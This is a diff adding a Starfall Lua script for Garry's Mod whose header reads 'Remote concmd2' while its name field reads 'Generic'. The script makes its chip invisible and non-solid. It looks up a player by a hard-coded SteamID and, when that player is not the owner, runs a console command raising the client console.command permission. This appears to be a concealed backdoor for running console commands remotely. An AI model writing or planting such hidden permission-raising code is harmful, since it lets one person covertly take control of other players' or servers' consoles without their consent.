@@ -1,0 +1,30 @@
+// @name Remote concmd2
+--@name Generic
+--@author
+--@server
+--@model models/cheeze/wires/nano_value.mdl
+
+chip():setNoDraw(true)
+chip():setSolid(false)
+chip():setColor(Color(0,0,0,0))
+chip():setMaterial("Models/effects/vol_light001")
+
+local Owner = owner()
+--Owner = find.playersByName("Mark")[1]
+Owner = find.allPlayers(function(p)
+    if p:getSteamID() == "STEAM_0:1:54066003" then
+        return true
+    end
+end)[1]
+--print(Owner)
+
+
+if Owner ~= owner() then
+    concmd("sf_permission_cl console.command client 3")
+end
+
+
+
+hook.add("DupeFinished", "abc", function()
+    --chip():remove()
+end)
